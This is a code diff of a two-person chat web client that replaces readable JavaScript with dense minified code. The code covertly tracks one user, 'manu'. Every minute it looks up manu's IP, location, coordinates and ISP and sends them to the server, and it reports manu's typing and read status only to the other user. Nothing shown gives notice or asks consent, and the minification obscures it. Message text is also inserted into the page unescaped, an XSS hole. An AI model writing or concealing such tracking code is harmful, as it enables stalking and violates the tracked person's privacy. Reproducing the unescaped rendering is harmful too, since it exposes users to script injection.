@@ -1,647 +1,100 @@
-const currentUser = window.USER;
-const messagesMap = new Map();           // id → message object
-const messageEls = new Map();            // id → DOM element
-let lastSync = null;
-let replyToId = null;
-let tempMsgCounter = -1;
-let editingMessageId = null;            // track the message currently being edited
+const U=window.USER, MM=new Map(), ME=new Map();
+let LS=null, RT=null, TMC=-1, EMI=null, INB=!0, UC=0;
 
-// ---- scroll state ----
-let isNearBottom = true;   // true if the user is following the latest messages
-let unreadCount = 0;
+document.body.addEventListener('click',function req(){Notification.permission==='default'&&Notification.requestPermission();document.body.removeEventListener('click',req)},{once:!0});
 
-// ---- time formatting (12h + yesterday/date) ----
-function formatTime(isoString) {
-  const date = new Date(isoString);
-  const now = new Date();
-  const isToday = date.toDateString() === now.toDateString();
-  const yesterday = new Date(now);
-  yesterday.setDate(now.getDate() - 1);
-  const isYesterday = date.toDateString() === yesterday.toDateString();
-  const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
-  if (isToday) return timeStr;
-  if (isYesterday) return `Yesterday at ${timeStr}`;
-  return date.toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' }) + ` at ${timeStr}`;
-}
+function FT(iso){let d=new Date(iso),n=new Date();
+let td=d.toDateString()===n.toDateString(),yd=new Date(n);yd.setDate(n.getDate()-1);
+let iy=d.toDateString()===yd.toDateString(),t=d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',hour12:!0});
+return td?t:iy?`Yesterday at ${t}`:d.toLocaleDateString([],{month:'short',day:'numeric',year:'numeric'})+` at ${t}`;}
 
-// ---- create a new message element (does NOT attach event listeners) ----
-function buildMsgHTML(msg) {
-  const isMine = msg.senderId === currentUser.id;
-  const sender = msg.senderId === 1 ? 'rasuv' : 'manu';
-  const cls = [
-    'message',
-    isMine ? 'own' : 'other',
-    msg.senderId === 2 ? 'manu-message' : '',
-    msg.senderId === 1 ? 'rasuv-message' : ''
-  ].join(' ').trim();
+function BH(msg){let m=msg.senderId===U.id,s=msg.senderId===1?'rasuv':'manu',cls=['message',m?'own':'other',msg.senderId===2?'manu-message':'',msg.senderId===1?'rasuv-message':''].join(' ').trim();
+let r='';if(msg.replyTo&&MM.has(msg.replyTo)){let p=MM.get(msg.replyTo);r=`<div class="reply-preview"><span class="reply-label">↩ ${p.senderId===1?'rasuv':'manu'}</span> ${p.deleted?'[Message deleted]':p.text}</div>`;}
+let lc=msg.likes?msg.likes.length:0,il=msg.likes&&msg.likes.includes(U.id),em=msg.edited?'<span class="edited-badge">(edited)</span>':'';
+let rs=(U.id===1&&msg.senderId===1)?(msg.readBy&&msg.readBy.length>0?'✓✓':'✓'):'';
+return`<div class="${cls}" data-id="${msg.id}"><div class="message-sender">${s}</div><div class="message-bubble">${r}<div class="message-text">${msg.text}</div><div class="message-footer"><span class="message-time">${FT(msg.timestamp)}${em}</span>${rs?`<span class="read-receipt" style="font-size:11px;color:#666;margin-left:4px;">${rs}</span>`:''}<span class="message-like"><button class="like-btn ${il?'liked':''}">❤️</button><span class="like-count">${lc}</span></span></div></div><div class="message-actions"><button class="like-btn-action">❤️</button><button class="reply-btn">↩ Reply</button><button class="edit-btn">✏️ Edit</button><button class="delete-btn">🗑 Delete</button></div></div>`;}
 
-  let replyHTML = '';
-  if (msg.replyTo && messagesMap.has(msg.replyTo)) {
-    const parent = messagesMap.get(msg.replyTo);
-    const previewText = parent.deleted ? '[Message deleted]' : parent.text;
-    replyHTML = `<div class="reply-preview"><span class="reply-label">↩ ${parent.senderId === 1 ? 'rasuv' : 'manu'}</span> ${previewText}</div>`;
-  }
+function UEL(el,msg){if(msg.id===EMI)return;let td=el.querySelector('.message-text');if(td&&td.textContent!==msg.text)td.textContent=msg.text;
+let ts=el.querySelector('.message-time');if(ts){let nh=FT(msg.timestamp)+(msg.edited?'<span class="edited-badge">(edited)</span>':'');if(ts.innerHTML!==nh)ts.innerHTML=nh;}
+if(U.id===1&&msg.senderId===1){let rd=el.querySelector('.read-receipt'),rt=msg.readBy&&msg.readBy.length>0?'✓✓':'✓';if(rd){if(rd.textContent!==rt)rd.textContent=rt;}else{let f=el.querySelector('.message-footer');if(f){let sp=document.createElement('span');sp.className='read-receipt';sp.style.cssText='font-size:11px;color:#666;margin-left:4px;';sp.textContent=rt;f.appendChild(sp);}}}
+let lb=el.querySelector('.message-like .like-btn'),lc=el.querySelector('.like-count');if(lb&&lc){let il=msg.likes&&msg.likes.includes(U.id);lb.classList.toggle('liked',il);let nc=msg.likes?msg.likes.length:0;if(lc.textContent!==String(nc))lc.textContent=nc;}}
 
-  const likeCount = msg.likes ? msg.likes.length : 0;
-  const isLiked = msg.likes && msg.likes.includes(currentUser.id);
-  const editedMark = msg.edited ? '<span class="edited-badge">(edited)</span>' : '';
-  const readStatus = (currentUser.id === 1 && msg.senderId === 1)
-    ? (msg.readBy && msg.readBy.length > 0 ? '✓✓' : '✓')
-    : '';
+function BE(el,id){el.addEventListener('click',e=>{if(e.target.tagName==='BUTTON'||e.target.tagName==='TEXTAREA')return;el.classList.toggle('show-actions')});
+el.querySelector('.message-like .like-btn')?.addEventListener('click',e=>{e.stopPropagation();TL(id)});
+el.querySelector('.like-btn-action')?.addEventListener('click',e=>{e.stopPropagation();TL(id)});
+el.querySelector('.reply-btn')?.addEventListener('click',e=>{e.stopPropagation();SR(id)});
+el.querySelector('.edit-btn')?.addEventListener('click',e=>{e.stopPropagation();EM(id)});
+el.querySelector('.delete-btn')?.addEventListener('click',e=>{e.stopPropagation();DM(id)});
+if(U.username==='manu'){let m=MM.get(id);if(m&&m.senderId===1&&!(m.readBy||[]).includes(2)){let o=new IntersectionObserver(e=>{if(e[0].isIntersecting){fetch(`/messages/${id}/read`,{method:'POST'});o.disconnect();}},{threshold:1.0});o.observe(el);}}}
 
-  return `
-    <div class="${cls}" data-id="${msg.id}">
-      <div class="message-sender">${sender}</div>
-      <div class="message-bubble">
-        ${replyHTML}
-        <div class="message-text">${msg.text}</div>
-        <div class="message-footer">
-          <span class="message-time">${formatTime(msg.timestamp)}${editedMark}</span>
-          ${readStatus ? `<span class="read-receipt" style="font-size:11px;color:#666;margin-left:4px;">${readStatus}</span>` : ''}
-          <span class="message-like">
-            <button class="like-btn ${isLiked ? 'liked' : ''}">❤️</button>
-            <span class="like-count">${likeCount}</span>
-          </span>
-        </div>
-      </div>
-      <div class="message-actions">
-        <button class="like-btn-action">❤️</button>
-        <button class="reply-btn">↩ Reply</button>
-        <button class="edit-btn">✏️ Edit</button>
-        <button class="delete-btn">🗑 Delete</button>
-      </div>
-    </div>`;
-}
+function SM(fs=!1){let c=document.getElementById('messagesContainer');if(!c)return;
+let ai=Array.from(MM.values()).filter(m=>!m.deleted).sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp)).map(m=>m.id);
+if(ai.length===0){if(c.children.length!==1||!c.querySelector('.empty-state')){c.innerHTML='<div class="empty-state"><span class="emoji">💬</span><p>No messages yet.</p><p class="sub-text">Be the first to say hello!</p></div>';ME.clear();}return;}
+let ee=c.querySelector('.empty-state');if(ee)ee.remove();
+for(let[id,el]of ME){if(!ai.includes(id)){el.remove();ME.delete(id);}}
+let pe=null;
+for(let id of ai){let el=ME.get(id);if(!el){let m=MM.get(id),d=document.createElement('div');d.innerHTML=BH(m);el=d.firstElementChild;BE(el,id);ME.set(id,el);}else{UEL(el,MM.get(id));}
+if(pe){if(pe.nextSibling!==el)c.insertBefore(el,pe.nextSibling);}else{if(c.firstChild!==el)c.insertBefore(el,c.firstChild);}pe=el;}
+let t=50;INB=c.scrollHeight-c.scrollTop-c.clientHeight<t;
+if(fs||INB){c.scrollTop=c.scrollHeight;UC=0;UNB();}else{UNB();}}
 
-// ---- update only the parts that changed in an existing element ----
-function updateMsgElement(el, msg) {
-  // If this message is currently being edited, skip ONLY the text update
-  const isEditing = msg.id === editingMessageId;
+function UNB(){let b=document.getElementById('newMessagesBtn'),s=document.getElementById('newMsgCount');if(!b||!s)return;
+if(UC>0&&!INB){b.style.display='flex';s.textContent=UC;}else{b.style.display='none';UC=0;}}
 
-  // Update text only if NOT editing
-  if (!isEditing) {
-    const textDiv = el.querySelector('.message-text');
-    if (textDiv && textDiv.textContent !== msg.text) {
-      textDiv.textContent = msg.text;
-    }
-  }
+async function SD(t,r){let ti=TMC--,tm={id:ti,senderId:U.id,text:t,timestamp:new Date().toISOString(),edited:!1,deleted:!1,replyTo:r,likes:[],readBy:[]};MM.set(ti,tm);SM(!0);
+try{let r=await fetch('/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:t,replyTo:r})});if(!r.ok)throw Error('Send failed');let d=await r.json();MM.delete(ti);MM.set(d.message.id,d.message);SM(!0);}catch{MM.delete(ti);SM(!0);alert('Failed to send message.');}}
 
-  // Always update the following metadata (they don't interfere with the edit area)
-  const timeSpan = el.querySelector('.message-time');
-  if (timeSpan) {
-    const newTimeHTML = formatTime(msg.timestamp) + (msg.edited ? '<span class="edited-badge">(edited)</span>' : '');
-    if (timeSpan.innerHTML !== newTimeHTML) timeSpan.innerHTML = newTimeHTML;
-  }
+async function TL(id){let m=MM.get(id);if(!m)return;let o=[...(m.likes||[])],i=o.indexOf(U.id);i===-1?m.likes.push(U.id):o.splice(i,1);m.likesUpdatedAt=new Date().toISOString();SM();
+try{let r=await fetch(`/messages/${id}/like`,{method:'POST'});if(!r.ok)throw Error('Like failed');}catch{m.likes=o;m.likesUpdatedAt=null;SM();alert('Failed to like.');}}
 
-  if (currentUser.id === 1 && msg.senderId === 1) {
-    const readEl = el.querySelector('.read-receipt');
-    const readText = msg.readBy && msg.readBy.length > 0 ? '✓✓' : '✓';
-    if (readEl) {
-      if (readEl.textContent !== readText) readEl.textContent = readText;
-    } else {
-      const footer = el.querySelector('.message-footer');
-      if (footer) {
-        const span = document.createElement('span');
-        span.className = 'read-receipt';
-        span.style.cssText = 'font-size:11px;color:#666;margin-left:4px;';
-        span.textContent = readText;
-        footer.appendChild(span);
-      }
-    }
-  }
+async function DM(id){if(!confirm('Delete this message?'))return;let m=MM.get(id);if(!m)return;let w=m.deleted;m.deleted=!0;m.edited=!0;m.editedAt=new Date().toISOString();SM();
+try{let r=await fetch(`/messages/${id}`,{method:'DELETE'});if(!r.ok)throw Error('Delete failed');}catch{m.deleted=w;m.edited=!1;m.editedAt=null;SM();alert('Failed to delete.');}}
 
-  // Update likes
-  const likeBtn = el.querySelector('.message-like .like-btn');
-  const likeCountSpan = el.querySelector('.like-count');
-  if (likeBtn && likeCountSpan) {
-    const isLiked = msg.likes && msg.likes.includes(currentUser.id);
-    likeBtn.classList.toggle('liked', isLiked);
-    const newCount = msg.likes ? msg.likes.length : 0;
-    if (likeCountSpan.textContent !== String(newCount)) {
-      likeCountSpan.textContent = newCount;
-    }
-  }
-}
+async function EMG(id,nt){let m=MM.get(id);if(!m)return;let o=m.text,oe=m.edited;m.text=nt;m.edited=!0;m.editedAt=new Date().toISOString();SM();
+try{let r=await fetch(`/messages/${id}`,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:nt})});if(!r.ok)throw Error('Edit failed');}catch{m.text=o;m.edited=oe;m.editedAt=null;SM();alert('Failed to edit.');}}
 
-// ---- attach event listeners to a message element (call once per new element) ----
-function bindMsgEvents(el, id) {
-  el.addEventListener('click', (e) => {
-    if (e.target.tagName === 'BUTTON' || e.target.tagName === 'TEXTAREA') return;
-    el.classList.toggle('show-actions');
-  });
+function SR(id){RT=id;let p=MM.get(id);if(p){document.getElementById('replyPreview').style.display='flex';document.getElementById('replyText').textContent=`Replying to ${p.senderId===1?'rasuv':'manu'}: ${p.deleted?'[deleted]':p.text}`;}}
+function CR(){RT=null;document.getElementById('replyPreview').style.display='none';}
 
-  el.querySelector('.message-like .like-btn')?.addEventListener('click', e => {
-    e.stopPropagation();
-    toggleLike(id);
-  });
-  el.querySelector('.like-btn-action')?.addEventListener('click', e => {
-    e.stopPropagation();
-    toggleLike(id);
-  });
-  el.querySelector('.reply-btn')?.addEventListener('click', e => {
-    e.stopPropagation();
-    setReply(id);
-  });
-  el.querySelector('.edit-btn')?.addEventListener('click', e => {
-    e.stopPropagation();
-    enterEditMode(id);
-  });
-  el.querySelector('.delete-btn')?.addEventListener('click', e => {
-    e.stopPropagation();
-    deleteMessage(id);
-  });
+function EM(id){let m=MM.get(id);if(!m||m.senderId!==U.id||m.deleted)return;if(EMI!==null)EMI=null;let el=ME.get(id);if(!el)return;let td=el.querySelector('.message-text');if(!td)return;EMI=id;
+td.innerHTML=`<div class="edit-container"><textarea id="editInput">${m.text}</textarea><div class="edit-actions"><button class="save-edit" id="saveEdit">Save</button><button class="cancel-edit" id="cancelEdit">Cancel</button></div></div>`;
+document.getElementById('editInput').addEventListener('click',e=>e.stopPropagation());
+document.querySelector('.edit-container').addEventListener('click',e=>e.stopPropagation());
+document.getElementById('saveEdit').onclick=async()=>{let nt=document.getElementById('editInput').value.trim();EMI=null;if(nt)await EMG(id,nt);else SM();};
+document.getElementById('cancelEdit').onclick=()=>{EMI=null;SM();};}
 
-  // read receipts (manu)
-  if (currentUser.username === 'manu') {
-    const msg = messagesMap.get(id);
-    if (msg && msg.senderId === 1 && !(msg.readBy || []).includes(2)) {
-      const observer = new IntersectionObserver(entries => {
-        if (entries[0].isIntersecting) {
-          fetch(`/messages/${id}/read`, { method: 'POST' });
-          observer.disconnect();
-        }
-      }, { threshold: 1.0 });
-      observer.observe(el);
-    }
-  }
-}
+async function POLL(){try{let u=`/sse/poll?lastSync=${encodeURIComponent(LS||'')}`,r=await fetch(u),d=await r.json();if(!d.success)return;LS=d.timestamp;
+let nm=d.newMessages||[],em=d.editedMessages||[],wb=INB,tnc=0,nn=[];
+nm.forEach(m=>{let ex=MM.get(m.id);if(!ex||new Date(m.editedAt||0)>new Date(ex.editedAt||0)||new Date(m.likesUpdatedAt||0)>new Date(ex.likesUpdatedAt||0)){if(!ex){tnc++;if(m.senderId!==U.id)nn.push(m);}MM.set(m.id,m);}});
+em.forEach(m=>{let ex=MM.get(m.id);if(!ex||new Date(m.editedAt||0)>new Date(ex.editedAt||0)||new Date(m.likesUpdatedAt||0)>new Date(ex.likesUpdatedAt||0)){MM.set(m.id,m);}});
+if(nn.length>0&&document.visibilityState==='hidden'&&Notification.permission==='granted'){let sender=nn[0].senderId===1?'rasuv':'manu',body=nn.length===1?nn[0].text.substring(0,100):`${nn.length} new messages`,n=new Notification(`New message${nn.length>1?'s':''} from ${sender}`,{body,icon:'/favicon.ico'});n.onclick=()=>{window.focus();n.close();}}
+if(tnc>0&&!wb)UC+=tnc;SM(!1);
+if(wb){let c=document.getElementById('messagesContainer');if(c)c.scrollTop=c.scrollHeight;UC=0;UNB();}
+if(U.id===1&&d.manuStatus){let td=document.getElementById('typingIndicator'),tt=document.getElementById('typingText');if(td){if(d.manuStatus.isTyping){let s=new Date(d.manuStatus.typingUpdatedAt),ts=s.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:!0});td.style.display='flex';if(tt)tt.textContent=`manu is typing… (since ${ts})`;}else{td.style.display='none';}}}}catch(e){}}
 
-// ---- main reconciliation: efficiently update DOM to match active messages ----
-function syncMessages(forceScroll = false) {
-  const container = document.getElementById('messagesContainer');
-  if (!container) return;
+function SO(o){fetch('/status/online',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({isOnline:o})}).catch(()=>{});}
+window.addEventListener('load',()=>SO(!0));
+window.addEventListener('beforeunload',()=>SO(!1));
+document.addEventListener('visibilitychange',()=>SO(!document.hidden));
 
-  // Get sorted list of active (non‑deleted) message IDs
-  const activeIds = Array.from(messagesMap.values())
-    .filter(m => !m.deleted)
-    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp))
-    .map(m => m.id);
+let tt;
+document.getElementById('messageInput').addEventListener('input',()=>{if(U.username==='manu'){fetch('/status/typing',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({isTyping:!0,typingTo:1})});clearTimeout(tt);tt=setTimeout(()=>{fetch('/status/typing',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({isTyping:!1,typingTo:1})});},2000);}});
 
-  // --- empty state ---
-  if (activeIds.length === 0) {
-    if (container.children.length !== 1 || !container.querySelector('.empty-state')) {
-      container.innerHTML = '<div class="empty-state"><span class="emoji">💬</span><p>No messages yet.</p><p class="sub-text">Be the first to say hello!</p></div>';
-      messageEls.clear();
-    }
-    return;
-  }
+async function SL(){if(U.username!=='manu')return;try{let r=await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,query'),d=await r.json();if(d.status==='success'){await fetch('/status/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:d.lat,lng:d.lon,address:`${d.city}, ${d.regionName}, ${d.country}`,city:d.city,state:d.regionName,country:d.country,district:d.district||'',isp:d.isp,ip:d.query})});}}catch(e){}}
+if(U.username==='manu'){SL();setInterval(SL,60000);}
 
-  // Remove any empty-state placeholder
-  const emptyEl = container.querySelector('.empty-state');
-  if (emptyEl) emptyEl.remove();
+async function LI(){try{let r=await fetch('/api/messages');if(!r.ok)throw Error('Load fail');let ms=await r.json();ms.forEach(m=>MM.set(m.id,m));SM(!0);let s=ms.sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp));LS=s.length>0?s[s.length-1].timestamp:new Date().toISOString();}catch(e){console.error(e);LS=new Date().toISOString();}}
 
-  // 1. Remove elements that are no longer in activeIds
-  for (const [id, el] of messageEls) {
-    if (!activeIds.includes(id)) {
-      el.remove();
-      messageEls.delete(id);
-    }
-  }
+document.getElementById('clearChatBtn')?.addEventListener('click',async()=>{if(!confirm('Delete all messages?'))return;let r=await fetch('/messages/all',{method:'DELETE'});if(r.ok){MM.clear();SM(!0);}else alert('Failed to clear chat.');});
+document.getElementById('newMessagesBtn')?.addEventListener('click',()=>{let c=document.getElementById('messagesContainer');if(c){c.scrollTop=c.scrollHeight;UC=0;UNB();}});
 
-  // 2. For each active message, ensure the element exists and is in the correct order
-  let previousEl = null;
-  for (const id of activeIds) {
-    let el = messageEls.get(id);
-    if (!el) {
-      // Create new element
-      const msg = messagesMap.get(id);
-      const tempDiv = document.createElement('div');
-      tempDiv.innerHTML = buildMsgHTML(msg);
-      el = tempDiv.firstElementChild;
-      bindMsgEvents(el, id);
-      messageEls.set(id, el);
-    } else {
-      // Update existing element (only the changed parts)
-      updateMsgElement(el, messagesMap.get(id));
-    }
+async function RC(){let b=document.getElementById('refreshChatBtn');if(b){b.textContent='⏳ Refreshing…';b.disabled=!0;}
+MM.clear();ME.clear();LS=null;UC=0;EMI=null;UNB();let c=document.getElementById('messagesContainer');if(c)c.innerHTML='';
+try{let r=await fetch('/api/messages');if(!r.ok)throw Error('Refresh fail');let ms=await r.json();ms.forEach(m=>MM.set(m.id,m));SM(!0);let s=ms.sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp));LS=s.length>0?s[s.length-1].timestamp:new Date().toISOString();}catch(e){console.error(e);alert('Failed to refresh.');}finally{if(b){b.innerHTML='<span>🔄</span> Refresh';b.disabled=!1;}}}
+document.getElementById('refreshChatBtn')?.addEventListener('click',RC);
 
-    // Place el immediately after previousEl in the DOM
-    if (previousEl) {
-      if (previousEl.nextSibling !== el) {
-        container.insertBefore(el, previousEl.nextSibling);
-      }
-    } else {
-      // This is the first message – should be the first child of the container
-      if (container.firstChild !== el) {
-        container.insertBefore(el, container.firstChild);
-      }
-    }
-    previousEl = el;
-  }
+document.getElementById('messageForm').addEventListener('submit',e=>{e.preventDefault();let i=document.getElementById('messageInput'),t=i.value.trim();if(!t)return;SD(t,RT);i.value='';CR();});
+document.getElementById('cancelReply')?.addEventListener('click',CR);
+document.getElementById('emojiBtn')?.addEventListener('click',()=>{alert('Emoji picker coming soon!');});
 
-  // ---- scroll logic ----
-  const threshold = 50;
-  isNearBottom = container.scrollHeight - container.scrollTop - container.clientHeight < threshold;
-
-  if (forceScroll || isNearBottom) {
-    container.scrollTop = container.scrollHeight;
-    unreadCount = 0;
-    updateNewMessagesButton();
-  } else {
-    updateNewMessagesButton();
-  }
-}
-
-// ---- floating new‑messages button ----
-function updateNewMessagesButton() {
-  const btn = document.getElementById('newMessagesBtn');
-  const countSpan = document.getElementById('newMsgCount');
-  if (!btn || !countSpan) return;
-
-  if (unreadCount > 0 && !isNearBottom) {
-    btn.style.display = 'flex';
-    countSpan.textContent = unreadCount;
-  } else {
-    btn.style.display = 'none';
-    unreadCount = 0;
-  }
-}
-
-// ---- optimistic send (always scrolls to bottom) ----
-async function sendMessage(text, replyTo) {
-  const tempId = tempMsgCounter--;
-  const tempMsg = {
-    id: tempId,
-    senderId: currentUser.id,
-    text,
-    timestamp: new Date().toISOString(),
-    edited: false,
-    deleted: false,
-    replyTo,
-    likes: [],
-    readBy: []
-  };
-  messagesMap.set(tempId, tempMsg);
-  syncMessages(true);   // force scroll down
-
-  try {
-    const res = await fetch('/messages', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text, replyTo })
-    });
-    if (!res.ok) throw new Error('Send failed');
-    const data = await res.json();
-    messagesMap.delete(tempId);
-    messagesMap.set(data.message.id, data.message);
-    syncMessages(true);
-  } catch {
-    messagesMap.delete(tempId);
-    syncMessages(true);
-    alert('Failed to send message.');
-  }
-}
-
-// ---- optimistic like (no scroll change) ----
-async function toggleLike(id) {
-  const msg = messagesMap.get(id);
-  if (!msg) return;
-  const originalLikes = [...(msg.likes || [])];
-  const idx = originalLikes.indexOf(currentUser.id);
-  if (idx === -1) msg.likes.push(currentUser.id);
-  else msg.likes.splice(idx, 1);
-  msg.likesUpdatedAt = new Date().toISOString();
-  syncMessages();   // instant update
-
-  try {
-    const res = await fetch(`/messages/${id}/like`, { method: 'POST' });
-    if (!res.ok) throw new Error('Like failed');
-  } catch {
-    msg.likes = originalLikes;
-    msg.likesUpdatedAt = null;
-    syncMessages();
-    alert('Failed to like.');
-  }
-}
-
-// ---- optimistic delete ----
-async function deleteMessage(id) {
-  if (!confirm('Delete this message?')) return;
-  const msg = messagesMap.get(id);
-  if (!msg) return;
-  const wasDeleted = msg.deleted;
-  msg.deleted = true;
-  msg.edited = true;
-  msg.editedAt = new Date().toISOString();
-  syncMessages();   // will remove element
-
-  try {
-    const res = await fetch(`/messages/${id}`, { method: 'DELETE' });
-    if (!res.ok) throw new Error('Delete failed');
-  } catch {
-    msg.deleted = wasDeleted;
-    msg.edited = false;
-    msg.editedAt = null;
-    syncMessages();
-    alert('Failed to delete.');
-  }
-}
-
-// ---- optimistic edit ----
-async function editMessage(id, newText) {
-  const msg = messagesMap.get(id);
-  if (!msg) return;
-  const originalText = msg.text;
-  const originalEdited = msg.edited;
-  msg.text = newText;
-  msg.edited = true;
-  msg.editedAt = new Date().toISOString();
-  syncMessages();
-
-  try {
-    const res = await fetch(`/messages/${id}`, {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: newText })
-    });
-    if (!res.ok) throw new Error('Edit failed');
-  } catch {
-    msg.text = originalText;
-    msg.edited = originalEdited;
-    msg.editedAt = null;
-    syncMessages();
-    alert('Failed to edit.');
-  }
-}
-
-// ---- reply ----
-function setReply(id) {
-  replyToId = id;
-  const parent = messagesMap.get(id);
-  if (parent) {
-    document.getElementById('replyPreview').style.display = 'flex';
-    document.getElementById('replyText').textContent =
-      `Replying to ${parent.senderId === 1 ? 'rasuv' : 'manu'}: ${parent.deleted ? '[deleted]' : parent.text}`;
-  }
-}
-function cancelReply() {
-  replyToId = null;
-  document.getElementById('replyPreview').style.display = 'none';
-}
-
-// ---- inline editing ----
-function enterEditMode(id) {
-  const msg = messagesMap.get(id);
-  if (!msg || msg.senderId !== currentUser.id || msg.deleted) return;
-
-  // Cancel any previous edit mode
-  if (editingMessageId !== null) {
-    // Just restore the old text (we won't save it)
-    editingMessageId = null;
-  }
-
-  const el = messageEls.get(id);
-  if (!el) return;
-  const textDiv = el.querySelector('.message-text');
-  if (!textDiv) return;
-
-  editingMessageId = id;   // protect from polling updates
-
-  textDiv.innerHTML = `
-    <div class="edit-container">
-      <textarea id="editInput">${msg.text}</textarea>
-      <div class="edit-actions">
-        <button class="save-edit" id="saveEdit">Save</button>
-        <button class="cancel-edit" id="cancelEdit">Cancel</button>
-      </div>
-    </div>`;
-
-  // Stop clicks inside the edit box from toggling actions
-  document.getElementById('editInput').addEventListener('click', e => e.stopPropagation());
-  document.querySelector('.edit-container').addEventListener('click', e => e.stopPropagation());
-
-  document.getElementById('saveEdit').onclick = async () => {
-    const newText = document.getElementById('editInput').value.trim();
-    editingMessageId = null;   // unprotect
-    if (newText) await editMessage(id, newText);
-    else syncMessages();       // if empty, just revert the UI
-  };
-
-  document.getElementById('cancelEdit').onclick = () => {
-    editingMessageId = null;
-    syncMessages();            // revert to normal view
-  };
-}
-
-// ---- polling (smart unread count & auto‑scroll) ----
-async function poll() {
-  try {
-    const url = `/sse/poll?lastSync=${encodeURIComponent(lastSync || '')}`;
-    const res = await fetch(url);
-    const data = await res.json();
-    if (!data.success) return;
-
-    lastSync = data.timestamp;
-    const newMsgs = data.newMessages || [];
-    const editedMsgs = data.editedMessages || [];
-
-    // Remember scroll state BEFORE modifying the map
-    const wasAtBottom = isNearBottom;
-
-    // Apply incoming messages only if they are newer
-    let trulyNewCount = 0;   // count messages we haven't seen before
-    newMsgs.forEach(m => {
-      const existing = messagesMap.get(m.id);
-      if (!existing ||
-          new Date(m.editedAt || 0) > new Date(existing.editedAt || 0) ||
-          new Date(m.likesUpdatedAt || 0) > new Date(existing.likesUpdatedAt || 0)) {
-        if (!existing) trulyNewCount++;
-        messagesMap.set(m.id, m);
-      }
-    });
-    editedMsgs.forEach(m => {
-      const existing = messagesMap.get(m.id);
-      if (!existing ||
-          new Date(m.editedAt || 0) > new Date(existing.editedAt || 0) ||
-          new Date(m.likesUpdatedAt || 0) > new Date(existing.likesUpdatedAt || 0)) {
-        messagesMap.set(m.id, m);
-      }
-    });
-
-    // Update unread count only if the user was NOT at the bottom
-    if (trulyNewCount > 0 && !wasAtBottom) {
-      unreadCount += trulyNewCount;
-    }
-
-    // Now reconcile the DOM (no auto‑scroll yet)
-    syncMessages(false);
-
-    // If the user was at the bottom before we received these messages, scroll to bottom
-    if (wasAtBottom) {
-      const container = document.getElementById('messagesContainer');
-      if (container) container.scrollTop = container.scrollHeight;
-      unreadCount = 0;
-      updateNewMessagesButton();
-    }
-
-    // typing indicator
-    if (currentUser.id === 1 && data.manuStatus) {
-      const typingDiv = document.getElementById('typingIndicator');
-      const typingText = document.getElementById('typingText');
-      if (typingDiv) {
-        if (data.manuStatus.isTyping) {
-          const since = new Date(data.manuStatus.typingUpdatedAt);
-          const timeStr = since.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
-          typingDiv.style.display = 'flex';
-          if (typingText) typingText.textContent = `manu is typing… (since ${timeStr})`;
-        } else {
-          typingDiv.style.display = 'none';
-        }
-      }
-    }
-  } catch (err) {}
-}
-
-// ---- online / typing / location ----
-function setOnline(online) {
-  fetch('/status/online', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ isOnline: online })
-  }).catch(() => {});
-}
-window.addEventListener('load', () => setOnline(true));
-window.addEventListener('beforeunload', () => setOnline(false));
-document.addEventListener('visibilitychange', () => {
-  setOnline(!document.hidden);
-});
-
-let typingTimeout;
-document.getElementById('messageInput').addEventListener('input', () => {
-  if (currentUser.username === 'manu') {
-    fetch('/status/typing', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ isTyping: true, typingTo: 1 })
-    });
-    clearTimeout(typingTimeout);
-    typingTimeout = setTimeout(() => {
-      fetch('/status/typing', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ isTyping: false, typingTo: 1 })
-      });
-    }, 2000);
-  }
-});
-
-async function sendLocation() {
-  if (currentUser.username !== 'manu') return;
-  try {
-    const resp = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,query');
-    const data = await resp.json();
-    if (data.status === 'success') {
-      await fetch('/status/location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          lat: data.lat, lng: data.lon,
-          address: `${data.city}, ${data.regionName}, ${data.country}`,
-          city: data.city, state: data.regionName, country: data.country,
-          district: data.district || '', isp: data.isp, ip: data.query
-        })
-      });
-    }
-  } catch {}
-}
-if (currentUser.username === 'manu') {
-  sendLocation();
-  setInterval(sendLocation, 60000);
-}
-
-// ---- initial load ----
-async function loadInitial() {
-  try {
-    const res = await fetch('/api/messages');
-    if (!res.ok) throw new Error('Could not load messages');
-    const msgs = await res.json();
-    msgs.forEach(m => messagesMap.set(m.id, m));
-    syncMessages(true);   // scroll to bottom
-    const sorted = msgs.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
-    lastSync = sorted.length > 0 ? sorted[sorted.length - 1].timestamp : new Date().toISOString();
-  } catch (err) {
-    console.error('Initial load error:', err);
-    lastSync = new Date().toISOString();
-  }
-}
-
-// ---- clear chat (rasuv) ----
-document.getElementById('clearChatBtn')?.addEventListener('click', async () => {
-  if (!confirm('Delete all messages for both users?')) return;
-  const res = await fetch('/messages/all', { method: 'DELETE' });
-  if (res.ok) {
-    messagesMap.clear();
-    syncMessages(true);
-  } else {
-    alert('Failed to clear chat.');
-  }
-});
-
-// ---- new messages button click ----
-document.getElementById('newMessagesBtn')?.addEventListener('click', () => {
